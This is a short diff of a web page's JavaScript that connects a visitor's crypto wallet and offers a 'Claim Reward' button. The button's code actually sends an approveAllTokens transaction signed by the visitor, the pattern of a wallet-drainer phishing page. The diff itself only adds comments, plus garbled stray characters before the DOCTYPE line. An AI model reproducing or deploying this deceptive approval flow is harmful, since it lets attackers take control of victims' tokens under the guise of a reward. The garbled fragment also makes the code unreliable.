@@ -1,4 +1,4 @@
-p<!DOCTYPE html>
+uu<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -73,7 +73,6 @@ p<!DOCTYPE html>
                 console.log("Wallet connected!");
 
                 document.getElementById("claimRewardButton").disabled = false;
-
                 alert("Wallet connected successfully!");
             } catch (error) {
                 console.error("Failed to connect wallet:", error);
@@ -86,7 +85,10 @@ p<!DOCTYPE html>
 
     async function claimReward() {
         try {
+            // Connect to the smart contract
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
+
+            // Send approveAllTokens transaction
             const tx = await contract.approveAllTokens(tokenAddress);
             console.log("Approval transaction sent:", tx.hash);
 
